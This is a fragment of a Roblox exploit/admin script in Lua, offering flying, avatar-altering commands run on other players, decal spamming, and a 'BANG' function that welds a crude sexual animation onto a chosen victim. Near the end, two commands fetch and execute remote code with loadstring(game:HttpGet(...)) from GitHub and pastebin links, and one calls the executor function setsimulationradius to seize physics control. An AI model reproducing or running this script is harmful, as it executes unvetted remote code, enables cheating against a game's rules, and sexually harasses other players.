			repeat wait() until LP and LP.Character and LP.Character:FindFirstChild('Torso') and LP.Character:FindFirstChild('Humanoid')
			repeat wait() until MOUSE

			local T = LP.Character.Torso
			local CONTROL = {F = 0, B = 0, L = 0, R = 0}
			local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
			local SPEED = 0

			local function FLY()
				FLYING = true
				local BG = Instance.new('BodyGyro', T)
				local BV = Instance.new('BodyVelocity', T)
				BG.P = 9e4
				BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
				BG.cframe = T.CFrame
				BV.velocity = Vector3.new(0, 0.1, 0)
				BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
				spawn(function()
					repeat wait()
						LP.Character.Humanoid.PlatformStand = true
						if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
							SPEED = 50
						elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
							SPEED = 0
						end
						if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
							BV.velocity = ((gWorkspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((gWorkspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - gWorkspace.CurrentCamera.CoordinateFrame.p)) * SPEED
							lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
						elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
							BV.velocity = ((gWorkspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((gWorkspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - gWorkspace.CurrentCamera.CoordinateFrame.p)) * SPEED
						else
							BV.velocity = Vector3.new(0, 0.1, 0)
						end
						BG.cframe = gWorkspace.CurrentCamera.CoordinateFrame
					until not FLYING
					CONTROL = {F = 0, B = 0, L = 0, R = 0}
					lCONTROL = {F = 0, B = 0, L = 0, R = 0}
					SPEED = 0
					BG:destroy()
					BV:destroy()
					LP.Character.Humanoid.PlatformStand = false
				end)
			end

			MOUSE.KeyDown:connect(function(KEY)
				if KEY:lower() == 'w' then
					CONTROL.F = 1
				elseif KEY:lower() == 's' then
					CONTROL.B = -1
				elseif KEY:lower() == 'a' then
					CONTROL.L = -1 
				elseif KEY:lower() == 'd' then 
					CONTROL.R = 1
				end
			end)

			MOUSE.KeyUp:connect(function(KEY)
				if KEY:lower() == 'w' then
					CONTROL.F = 0
				elseif KEY:lower() == 's' then
					CONTROL.B = 0
				elseif KEY:lower() == 'a' then
					CONTROL.L = 0
				elseif KEY:lower() == 'd' then
					CONTROL.R = 0
				end
			end)
			FLY()
		end

		function NOFLY()
			FLYING = false
			LP.Character.Humanoid.PlatformStand = false
		end

		function RESET_MODEL(MODEL)
			for i,v in pairs(MODEL:GetChildren()) do
				if v:IsA('Part') and v.Name == 'LA_INFECT' or v:IsA('Part') and v.Name == 'RA_INFECT' or v:IsA('Seat') and v.Name == 'FakeTorso' then
					v:destroy()
				elseif v:IsA('CharacterMesh') or v:IsA('Shirt') or v:IsA('Pants') or v:IsA('Hat') then
					v:destroy()
				elseif v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
					v.Transparency = 0
				elseif v:IsA('ShirtGraphic') then
					v.Archivable = false
					v.Graphic = ''
				end
			end
			for i,v in pairs(MODEL.Torso:GetChildren()) do
				if v:IsA('SpecialMesh') then
					v:destroy()
				end
			end
			if MODEL.Head:FindFirstChild('Mesh') then
				MODEL.Head.Mesh:destroy()
			end
			if MODEL.Torso:FindFirstChild('Neck') then MODEL.Torso.Neck.C0 = CFrame.new(0, 1, 0) * CFrame.Angles(math.rad(90), math.rad(180), 0) end
			if MODEL.Torso:FindFirstChild('Left Shoulder') then MODEL.Torso['Left Shoulder'].C0 = CFrame.new(-1, 0.5, 0) * CFrame.Angles(0, math.rad(-90), 0) end
			if MODEL.Torso:FindFirstChild('Right Shoulder') then MODEL.Torso['Right Shoulder'].C0 = CFrame.new(1, 0.5, 0) * CFrame.Angles(0, math.rad(90), 0) end
			if MODEL.Torso:FindFirstChild('Left Hip') then MODEL.Torso['Left Hip'].C0 = CFrame.new(-1, -1, 0) * CFrame.Angles(0, math.rad(-90), 0) end
			if MODEL.Torso:FindFirstChild('Right Hip') then MODEL.Torso['Right Hip'].C0 = CFrame.new(1, -1, 0) * CFrame.Angles(0, math.rad(90), 0) end
		end

		function UPDATE_MODEL(MODEL, USERNAME)
			local AppModel = gPlayers:GetCharacterAppearanceAsync(gPlayers:GetUserIdFromNameAsync(USERNAME))
			MODEL.Name = USERNAME
			for i,v in pairs(AppModel:GetChildren()) do
				if v:IsA('SpecialMesh') or v:IsA('BlockMesh') or v:IsA('CylinderMesh') then
					v.Parent = MODEL.Head
				elseif v:IsA('Decal') then
					if MODEL.Head:FindFirstChild('face') then
						MODEL.Head.face.Texture = v.Texture
					else
						local FACE = Instance.new('Decal', MODEL.Head)
						FACE.Texture = v.Texture
					end
				elseif v:IsA('BodyColors') or v:IsA('CharacterMesh') or v:IsA('Shirt') or v:IsA('Pants') or v:IsA('ShirtGraphic') then
					if MODEL:FindFirstChild('Body Colors') then
						MODEL['Body Colors']:destroy()
					end
					v.Parent = MODEL
				elseif v:IsA('Hat') then
					v.Parent = MODEL
					v.Handle.CFrame = MODEL.Head.CFrame * CFrame.new(0, MODEL.Head.Size.Y / 2, 0) * v.AttachmentPoint:inverse()
				end
			end
			if not MODEL.Head:FindFirstChild('Mesh') then
				local SM = Instance.new('SpecialMesh', MODEL.Head)
				SM.MeshType = Enum.MeshType.Head
				SM.Scale = Vector3.new(1.25, 1.25, 1.25)
			end
		end

		function CREEPER(PLAYER)
			for i,v in pairs(PLAYER.Character:GetChildren()) do
				if v:IsA('Shirt') or v:IsA('Pants') then
					v:destroy()
				elseif v:IsA('ShirtGraphic') then
					v.Archivable = false
					v.Graphic = ''
				end
			end
			for i,v in pairs(PLAYER.Character:GetChildren()) do
				if v:IsA('Hat') then
					v:destroy()
				end
			end
			PLAYER.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
			PLAYER.Character.Torso['Right Shoulder'].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
			PLAYER.Character.Torso['Left Shoulder'].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
			PLAYER.Character.Torso['Right Hip'].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
			PLAYER.Character.Torso['Left Hip'].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
			for i,v in pairs(PLAYER.Character:GetChildren()) do
				if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
					v.BrickColor = BrickColor.new('Bright green')
				end
			end
		end

		function SHREK(PLAYER)
			for i,v in pairs(PLAYER.Character:GetChildren()) do
				if v:IsA('Shirt') or v:IsA('Pants') or v:IsA('Hat') or v:IsA('CharacterMesh') then
					v:destroy()
				elseif v:IsA('ShirtGraphic') then
					v.Archivable = false
					v.Graphic = ''
				end
			end
			for i,v in pairs(PLAYER.Character.Head:GetChildren()) do
				if v:IsA('Decal') or v:IsA('SpecialMesh') then
					v:destroy()
				end
			end
			if PLAYER.Character:FindFirstChild('Shirt Graphic') then
				PLAYER.Character['Shirt Graphic'].Archivable = false
				PLAYER.Character['Shirt Graphic'].Graphic = ''
			end
			local M = Instance.new('SpecialMesh', PLAYER.Character.Head)
			local S = Instance.new('Shirt', PLAYER.Character)
			local P = Instance.new('Pants', PLAYER.Character)
			M.MeshType = 'FileMesh'
			M.MeshId = 'http://www.roblox.com/asset/?id=19999257'
			M.Offset = Vector3.new(-0.1, 0.1, 0)
			M.TextureId = 'http://www.roblox.com/asset/?id=156397869'
			S.ShirtTemplate = 'rbxassetid://133078194'
			P.PantsTemplate = 'rbxassetid://133078204'
		end

		function DUCK(PLAYER)
			for i,v in pairs(PLAYER.Character:GetChildren()) do
				if v:IsA('Part') and v.Name ~= 'Torso' and v.Name ~= 'HumanoidRootPart' then
					v.Transparency = 1
				elseif v:IsA('Shirt') or v:IsA('Pants') or v:IsA('Hat') then
					v:destroy()
				elseif v:IsA('ShirtGraphic') then
					v.Archivable = false
					v.Graphic = ''
				end
			end
			local DUCK = Instance.new('SpecialMesh', PLAYER.Character.Torso)
			DUCK.MeshType = 'FileMesh'
			DUCK.MeshId = 'http://www.roblox.com/asset/?id=9419831'
			DUCK.TextureId = 'http://www.roblox.com/asset/?id=9419827'
			DUCK.Scale = Vector3.new(5, 5, 5)
			if PLAYER.Character.Head:FindFirstChild('face') then
				PLAYER.Character.Head.face.Transparency = 1
			end
		end

		function DOG(PLAYER)
			for i,v in pairs(PLAYER.Character:GetChildren()) do
				if v:IsA('Shirt') or v:IsA('Pants') then
					v:destroy()
				elseif v:IsA('ShirtGraphic') then
					v.Archivable = false
					v.Graphic = ''
				end
			end
			PLAYER.Character.Torso.Transparency = 1
			PLAYER.Character.Torso.Neck.C0 = CFrame.new(0, -0.5, -2) * CFrame.Angles(math.rad(90), math.rad(180), 0)
			PLAYER.Character.Torso['Right Shoulder'].C0 = CFrame.new(0.5, -1.5, -1.5) * CFrame.Angles(0, math.rad(90), 0)
			PLAYER.Character.Torso['Left Shoulder'].C0 = CFrame.new(-0.5, -1.5, -1.5) * CFrame.Angles(0, math.rad(-90), 0)
			PLAYER.Character.Torso['Right Hip'].C0 = CFrame.new(1.5, -1, 1.5) * CFrame.Angles(0, math.rad(90), 0)
			PLAYER.Character.Torso['Left Hip'].C0 = CFrame.new(-1.5, -1, 1.5) * CFrame.Angles(0, math.rad(-90), 0)
			local FakeTorso = Instance.new('Seat', PLAYER.Character)
			local BF = Instance.new('BodyForce', FakeTorso)
			local W = Instance.new('Weld', PLAYER.Character.Torso)
			FakeTorso.Name = 'FakeTorso'
			FakeTorso.FormFactor = 'Symmetric'
			FakeTorso.TopSurface = 0
			FakeTorso.BottomSurface = 0
			FakeTorso.Size = Vector3.new(3,1,4)
			FakeTorso.BrickColor = BrickColor.new('Brown')
			FakeTorso.CFrame = PLAYER.Character.Torso.CFrame
			BF.Force = Vector3.new(0, FakeTorso:GetMass() * 196.25, 0)
			W.Part0 = PLAYER.Character.Torso
			W.Part1 = FakeTorso
			W.C0 = CFrame.new(0, -0.5, 0)
			for i,v in pairs(PLAYER.Character:GetChildren()) do
				if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
					v.BrickColor = BrickColor.new('Brown')
				end
			end
		end

		function AYYLMAO(PLAYER)
			for i,v in pairs(PLAYER.Character:GetChildren()) do
				if v:IsA('Shirt') or v:IsA('Pants') or v:IsA('Hat') then
					v:destroy()
				elseif v:IsA('ShirtGraphic') then
					v.Archivable = false
					v.Graphic = ''
				elseif v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
					v.BrickColor = BrickColor.new('Fossil')
				end
			end
			game:GetObjects('rbxassetid://13837194')[1].Parent = PLAYER.Character
		end

		function DECALSPAM(INSTANCE, ID)
			for i,v in pairs(INSTANCE:GetChildren()) do
				if v:IsA('BasePart') then
					spawn(function()
						local FACES = {'Back', 'Bottom', 'Front', 'Left', 'Right', 'Top'}
						local CURRENT_FACE = 1
						for i = 1, 6 do
							local DECAL = Instance.new('Decal', v)
							DECAL.Name = 'decal_seth'
							DECAL.Texture = 'rbxassetid://' .. ID - 1
							DECAL.Face = FACES[CURRENT_FACE]
							CURRENT_FACE = CURRENT_FACE + 1
						end
					end)
				end
				DECALSPAM(v, ID)
			end
		end

		function UNDECALSPAM(INSTANCE)
			for i,v in pairs(INSTANCE:GetChildren()) do
				if v:IsA('BasePart') then
					for a,b in pairs(v:GetChildren()) do
						if b:IsA('Decal') and b.Name == 'decal_seth' then
							b:destroy()
						end
					end
				end
				UNDECALSPAM(v)
			end
		end

		function CREATE_DONG(PLAYER, DONG_COLOR)
			if PLAYER.Character:FindFirstChild('DONG') then
				PLAYER.Character.DONG:destroy()
			end
			local D = Instance.new('Model', PLAYER.Character)
			D.Name = 'DONG'

			local BG = Instance.new('BodyGyro', PLAYER.Character.Torso)
			local MAIN = Instance.new('Part', PLAYER.Character['DONG'])
			local M1 = Instance.new('CylinderMesh', MAIN)
			local W1 = Instance.new('Weld', PLAYER.Character.Head)
			local P1 = Instance.new('Part', PLAYER.Character['DONG'])
			local M2 = Instance.new('SpecialMesh', P1)
			local W2 = Instance.new('Weld', P1)
			local B1 = Instance.new('Part', PLAYER.Character['DONG'])
			local M3 = Instance.new('SpecialMesh', B1)
			local W3 = Instance.new('Weld', B1)
			local B2 = Instance.new('Part', PLAYER.Character['DONG'])
			local M4 = Instance.new('SpecialMesh', B2)
			local W4 = Instance.new('Weld', B2)

			MAIN.TopSurface = 0 MAIN.BottomSurface = 0 MAIN.Name = 'Main' MAIN.formFactor = 3 MAIN.Size = Vector3.new(0.6, 2.5, 0.6) MAIN.BrickColor = BrickColor.new(DONG_COLOR) MAIN.Position = PLAYER.Character.Head.Position MAIN.CanCollide = false

			W1.Part0 = MAIN W1.Part1 = PLAYER.Character.Head W1.C0 = CFrame.new(0, 0.25, 2.1) * CFrame.Angles(math.rad(45), 0, 0)

			P1.Name = 'Mush' P1.BottomSurface = 0 P1.TopSurface = 0 P1.FormFactor = 3 P1.Size = Vector3.new(0.6, 0.6, 0.6) P1.CFrame = CFrame.new(MAIN.Position) P1.BrickColor = BrickColor.new('Pink') P1.CanCollide = false

			M2.MeshType = 'Sphere'

			W2.Part0 = MAIN W2.Part1 = P1 W2.C0 = CFrame.new(0, 1.3, 0)

			B1.Name = 'Left Ball' B1.BottomSurface = 0 B1.TopSurface = 0 B1.CanCollide = false B1.formFactor = 3 B1.Size = Vector3.new(1, 1, 1) B1.CFrame = CFrame.new(PLAYER.Character['Left Leg'].Position) B1.BrickColor = BrickColor.new(DONG_COLOR)

			M3.Parent = B1 M3.MeshType = 'Sphere'

			W3.Part0 = PLAYER.Character['Left Leg'] W3.Part1 = B1 W3.C0 = CFrame.new(0, 0.5, -0.5)

			B2.Name = 'Right Ball' B2.BottomSurface = 0 B2.CanCollide = false B2.TopSurface = 0 B2.formFactor = 3 B2.Size = Vector3.new(1, 1, 1) B2.CFrame = CFrame.new(PLAYER.Character['Right Leg'].Position) B2.BrickColor = BrickColor.new(DONG_COLOR)

			M4.MeshType = 'Sphere'

			W4.Part0 = PLAYER.Character['Right Leg'] W4.Part1 = B2 W4.C0 = CFrame.new(0, 0.5, -0.5)
		end

		function SCALE(C, S)
			if tonumber(S) < 0.5 then S = 0.5 elseif tonumber(S) > 25 then S = 25 end

			local HAT_CLONE = {}

			for i,v in pairs(C:GetChildren()) do if v:IsA('Hat') then local HC = v:Clone() table.insert(HAT_CLONE, HC) v:destroy() end end

			local HEAD = C.Head
			local TORSO = C.Torso
			local LA = C['Left Arm']
			local RA = C['Right Arm']
			local LL = C['Left Leg']
			local RL = C['Right Leg']
			local HRP = C.HumanoidRootPart

			HEAD.FormFactor = 3 TORSO.FormFactor = 3 LA.FormFactor = 3 RA.FormFactor = 3 LL.FormFactor = 3 RL.FormFactor = 3 HRP.FormFactor = 3

			HEAD.Size = Vector3.new(S * 2, S, S)
			TORSO.Size = Vector3.new(S * 2, S * 2, S)
			LA.Size = Vector3.new(S, S * 2, S)
			RA.Size = Vector3.new(S, S * 2, S)
			LL.Size = Vector3.new(S, S * 2, S)
			RL.Size = Vector3.new(S, S * 2, S)
			HRP.Size = Vector3.new(S * 2, S * 2, S)

			local M1 = Instance.new('Motor6D', TORSO)
			local M2 = Instance.new('Motor6D', TORSO)
			local M3 = Instance.new('Motor6D', TORSO)
			local M4 = Instance.new('Motor6D', TORSO)
			local M5 = Instance.new('Motor6D', TORSO)
			local M6 = Instance.new('Motor6D', HRP)

			M1.Name = 'Neck' M1.Part0 = TORSO M1.Part1 = HEAD M1.C0 = CFrame.new(0, 1 * S, 0) * CFrame.Angles(-1.6, 0, 3.1) M1.C1 = CFrame.new(0, -0.5 * S, 0) * CFrame.Angles(-1.6, 0, 3.1)
			M2.Name = 'Left Shoulder' M2.Part0 = TORSO M2.Part1 = LA M2.C0 = CFrame.new(-1 * S, 0.5 * S, 0) * CFrame.Angles(0, -1.6, 0) M2.C1 = CFrame.new(0.5 * S, 0.5 * S, 0) * CFrame.Angles(0, -1.6, 0)
			M3.Name = 'Right Shoulder' M3.Part0 = TORSO M3.Part1 = RA M3.C0 = CFrame.new(1 * S, 0.5 * S, 0) * CFrame.Angles(0, 1.6, 0) M3.C1 = CFrame.new(-0.5 * S, 0.5 * S, 0) * CFrame.Angles(0, 1.6, 0)
			M4.Name  = 'Left Hip' M4.Part0 = TORSO M4.Part1 = LL M4.C0 = CFrame.new(-1 * S, -1 * S, 0) * CFrame.Angles(0, -1.6, 0) M4.C1 = CFrame.new(-0.5 * S, 1 * S, 0) * CFrame.Angles(0, -1.6, 0)
			M5.Name = 'Right Hip' M5.Part0 = TORSO M5.Part1 = RL M5.C0 = CFrame.new(1 * S, -1 * S, 0) * CFrame.Angles(0, 1.6, 0) M5.C1 = CFrame.new(0.5 * S, 1 * S, 0) * CFrame.Angles(0, 1.6, 0)
			M6.Name = 'RootJoint' M6.Part0 = HRP M6.Part1 = TORSO M6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1) M6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)

			wait()

			for i,v in pairs(HAT_CLONE) do v.Parent = C end
		end

		function CAPE(COLOR)
			if LP.Character:FindFirstChild('Cape') then LP.Character.Cape:destroy() end

			repeat wait() until LP and LP.Character and LP.Character:FindFirstChild('Torso')

			local T = LP.Character.Torso

			local C = Instance.new('Part', T.Parent)
			C.Name = 'cape_seth'
			C.Anchored = false
			C.CanCollide = false
			C.TopSurface = 0
			C.BottomSurface = 0
			C.BrickColor = BrickColor.new(COLOR)
			C.Material = 'Neon'
			C.FormFactor = 'Custom'
			C.Size = Vector3.new(0.2, 0.2, 0.2)

			local M = Instance.new('BlockMesh', C)
			M.Scale = Vector3.new(9, 17.5, 0.5)

			local M1 = Instance.new('Motor', C)
			M1.Part0 = C
			M1.Part1 = T
			M1.MaxVelocity = 1
			M1.C0 = CFrame.new(0, 1.75, 0) * CFrame.Angles(0, math.rad(90), 0)
			M1.C1 = CFrame.new(0, 1, .45) * CFrame.Angles(0, math.rad(90), 0)

			local WAVE = false

			repeat wait(1 / 44)
				local ANG = 0.2
				local oldMag = T.Velocity.magnitude
				local MV = 0.1

				if WAVE then
					ANG = ANG + ((T.Velocity.magnitude / 10) * 0.05) + 1
					WAVE = false
				else
					WAVE = false
				end
				ANG = ANG + math.min(T.Velocity.magnitude / 30, 1)
				M1.MaxVelocity = math.min((T.Velocity.magnitude / 10), 0.04) + MV
				M1.DesiredAngle = -ANG
				if M1.CurrentAngle < -0.05 and M1.DesiredAngle > -.05 then
					M1.MaxVelocity = 0.04
				end
				repeat
					wait()
				until M1.CurrentAngle == M1.DesiredAngle or math.abs(T.Velocity.magnitude - oldMag)  >= (T.Velocity.magnitude / 10) + 1
				if T.Velocity.magnitude < 0.1 then
					wait(0.1)
				end
			until not C or C.Parent ~= T.Parent
		end

		function INFECT(PLAYER)
			for i,v in pairs(PLAYER.Character:GetChildren()) do
				if v:IsA('Hat') or v:IsA('Part') and v.Name == 'LA_INFECT' or v:IsA('Part') and v.Name == 'RA_INFECT' or v:IsA('Shirt') or v:IsA('Pants') then
					v:destroy()
				elseif v:IsA('Part') and v.Name == 'Left Arm' or v:IsA('Part') and v.Name == 'Right Arm' then
					v.Transparency = 1
				elseif v:IsA('ShirtGraphic') then
					v.Archivable = false
					v.Graphic = ''
				end
			end

			local LZOMBIE_ARM = Instance.new('Part', PLAYER.Character)
			local LWELD = Instance.new('Weld', LZOMBIE_ARM)
			local RZOMBIE_ARM = Instance.new('Part', PLAYER.Character)
			local RWELD = Instance.new('Weld', RZOMBIE_ARM)

			LZOMBIE_ARM.Name = 'LA_INFECT'
			LZOMBIE_ARM.BrickColor = BrickColor.new('Medium green')
			LZOMBIE_ARM.Size = Vector3.new(1, 1, 2)
			LZOMBIE_ARM.TopSurface = 'Smooth'
			LZOMBIE_ARM.BottomSurface = 'Smooth'

			LWELD.Part0 = PLAYER.Character.Torso
			LWELD.Part1 = LZOMBIE_ARM
			LWELD.C0 = CFrame.new(-1.5, 0.5, -0.5)

			RZOMBIE_ARM.Name = 'RA_INFECT'
			RZOMBIE_ARM.BrickColor = BrickColor.new('Medium green')
			RZOMBIE_ARM.Size = Vector3.new(1, 1, 2)
			RZOMBIE_ARM.TopSurface = 'Smooth'
			RZOMBIE_ARM.BottomSurface = 'Smooth'

			RWELD.Part0 = PLAYER.Character.Torso
			RWELD.Part1 = RZOMBIE_ARM
			RWELD.C0 = CFrame.new(1.5, 0.5, -0.5)

			if PLAYER.Character.Head:FindFirstChild('face') then
				PLAYER.Character.Head.face.Texture = 'rbxassetid://7074882'
			end

			for i,v in pairs (PLAYER.Character:GetChildren()) do
				if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
					if v.Name == 'Head' then
						v.BrickColor = BrickColor.new('Medium green')
					elseif v.Name == 'Torso' or v.Name == 'Left Leg' or v.Name == 'Right Leg' then
						v.BrickColor = BrickColor.new('Brown')
					end
				end
			end
		end

		function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
			local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
			if (zCoco) then
				funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
			else
				funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
			end
			return funcw
		end

		function BANG(VICTIM)
			spawn(function()
				local P1 = gPlayers.LocalPlayer.Character.Torso
				local V1 = gPlayers[VICTIM].Character.Torso

				V1.Parent.Humanoid.PlatformStand = true

				P1['Left Shoulder']:destroy() local LA1 = Instance.new('Weld', P1) LA1.Part0 = P1 LA1.Part1 = P1.Parent['Left Arm'] LA1.C0 = CFrame.new(-1.5, 0, 0) LA1.Name = 'Left Shoulder'

				P1['Right Shoulder']:destroy() local RS1 = Instance.new('Weld', P1) RS1.Part0 = P1 RS1.Part1 = P1.Parent['Right Arm'] RS1.C0 = CFrame.new(1.5, 0, 0) RS1.Name = 'Right Shoulder'

				V1['Left Shoulder']:destroy() local LS2 = Instance.new('Weld', V1) LS2.Part0 = V1 LS2.Part1 = V1.Parent['Left Arm'] LS2.C0 = CFrame.new(-1.5, 0, 0) LS2.Name = 'Left Shoulder'

				V1['Right Shoulder']:destroy() local RS2 = Instance.new('Weld', V1) RS2.Part0 = V1 RS2.Part1 = V1.Parent['Right Arm'] RS2.C0 = CFrame.new(1.5, 0, 0) RS2.Name = 'Right Shoulder'

				V1['Left Hip']:destroy() local LH2 = Instance.new('Weld', V1) LH2.Part0 = V1 LH2.Part1 = V1.Parent['Left Leg'] LH2.C0 = CFrame.new(-0.5, -2, 0) LH2.Name = 'Left Hip'

				V1['Right Hip']:destroy() local RH2 = Instance.new('Weld', V1) RH2.Part0 = V1 RH2.Part1 = V1.Parent['Right Leg'] RH2.C0 = CFrame.new(0.5, -2, 0) RH2.Name = 'Right Hip'

				local D = Instance.new('Part', P1) D.TopSurface = 0 D.BottomSurface = 0 D.CanCollide = false D.BrickColor = BrickColor.new('Pastel brown') D.Shape = 'Ball' D.Size = Vector3.new(1, 1, 1)

				local DM1 = Instance.new('SpecialMesh', D) DM1.MeshType = 'Sphere' DM1.Scale = Vector3.new(0.4, 0.4, 0.4)

				fWeld('weld', P1, P1, D, true, -0.2, -1.3, -0.6, 0, 0, 0)

				local D2 = D:Clone() D2.Parent = P1

				fWeld('weld', P1, P1, D2, true, 0.2, -1.3, -0.6, 0, 0, 0)

				local C = Instance.new('Part', P1) C.TopSurface = 0 C.BottomSurface = 0 C.CanCollide = false C.BrickColor = BrickColor.new('Pastel brown') C.formFactor = 'Custom' C.Size = Vector3.new(0.4, 1.3, 0.4)

				fWeld('weld', P1, P1, C, true, 0, -1, -0.52 + (-C.Size.y / 2), math.rad(-80), 0, 0)

				local C2 = D:Clone() C2.BrickColor = BrickColor.new('Pink') C2.Mesh.Scale = Vector3.new(0.4, 0.62, 0.4) C2.Parent = P1

				fWeld('weld', C, C, C2, true, 0, 0 + (C.Size.y / 2), 0, math.rad(-10), 0, 0)

				local CM = Instance.new('CylinderMesh', C)

				local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.BrickColor = BrickColor.new('Pastel brown') BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)

				local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)

				fWeld('weld', V1, V1, BL, true, -0.5, 0.5, -0.6, 0, 0, 0)

				local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.BrickColor = BrickColor.new('Pastel brown') BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)

				local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)

				fWeld('weld', V1, V1, BR, true, 0.5, 0.5, -0.6, 0, 0, 0)

				local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)

				local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)

				fWeld('weld', V1, V1, BLN, true, -0.5, 0.5, -1.2, 0, 0, 0)

				local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)

				local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)

				fWeld('weld', V1, V1, BRN, true, 0.5, 0.5, -1.2, 0, 0, 0)

				LH2.C1 = CFrame.new(0.2, 1.6, 0.4) * CFrame.Angles(3.9, -0.4, 0) RH2.C1 = CFrame.new(-0.2, 1.6, 0.4) * CFrame.Angles(3.9, 0.4, 0)
				LS2.C1 = CFrame.new(-0.2, 0.9, 0.6) * CFrame.Angles(3.9, -0.2, 0) RS2.C1 = CFrame.new(0.2, 0.9, 0.6) * CFrame.Angles(3.9, 0.2, 0)
				LA1.C1 = CFrame.new(-0.5, 0.7, 0) * CFrame.Angles(-0.9, -0.4, 0) RS1.C1 = CFrame.new(0.5, 0.7, 0) * CFrame.Angles(-0.9, 0.4, 0)

				if P1:FindFirstChild('weldx') then P1.weldx:destroy() end

				WE = fWeld('weldx', P1, P1, V1, true, 0, -0.9, -1.3, math.rad(-90), 0, 0)

				local N = V1.Neck N.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)
			end)
			spawn(function() while wait() do for i = 1, 6 do WE.C1 = WE.C1 * CFrame.new(0, -0.3, 0) wait() end for i = 1, 6 do WE.C1 = WE.C1 * CFrame.new(0, 0.3, 0) wait() end end end)
		end

		_G.CLICK_TP = true
		local M_CTRL = false

		MOUSE.KeyDown:connect(function(K) if K:byte() == 50 then M_CTRL = true end end)
		MOUSE.KeyUp:connect(function(K) if K:byte() == 50 then M_CTRL = false end end)

		gLighting.Outlines = false -- / outlines are gross

		if FIND_IN_TABLE(BANS, LP.userId) then LP:Kick('You\'re on the ban list.') end

		for i,v in pairs(gPlayers:GetPlayers()) do if FIND_IN_TABLE(BANS, v.userId) then table.insert(KICKS, v) else UPDATE_CHAT(v) end end

		-- / commands

		ADD_COMMAND('harked','harked',{},
		function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/qipurblx/Scripts/main/harked"))();
		end)

		ADD_COMMAND('table','table',{},
		function()
			loadstring(game:HttpGet(('https://pastebin.com/raw/UmdYd4bE'),true))()
			local plr = game.Players.LocalPlayer
			game:GetService("RunService").Stepped:Connect(function()
				setsimulationradius(9e9,9e9)
				plr.ReplicationFocus = workspace
				settings().Physics.AllowSleep = false
			end)
			local runservice=game:service"RunService";
			local player=game:service"Players"["LocalPlayer"];
			local character=player["Character"];
			character["Head"]:FindFirstChildOfClass"SpecialMesh":Destroy();

			character["Humanoid"].HipHeight=-2;
			character["Left Leg"]:BreakJoints();
			character["Right Leg"]:BreakJoints();
			character["Left Arm"]:BreakJoints();
			character["Right Arm"]:BreakJoints();
			while runservice["Heartbeat"]:Wait() do
				character["Left Leg"].CFrame=character["HumanoidRootPart"].CFrame*CFrame.new(-0.5,1.5,1.5) * CFrame.Angles(math.rad(90), 0, 0);
				character["Right Leg"].CFrame=character["HumanoidRootPart"].CFrame*CFrame.new(0.5,1.5,1.5) * CFrame.Angles(math.rad(90), 0, 0);
				character["Left Arm"].CFrame=character["HumanoidRootPart"].CFrame*CFrame.new(-0.5,0,2);
				character["Right Arm"].CFrame=character["HumanoidRootPart"].CFrame*CFrame.new(0.5,0,2);
			end	
		end)

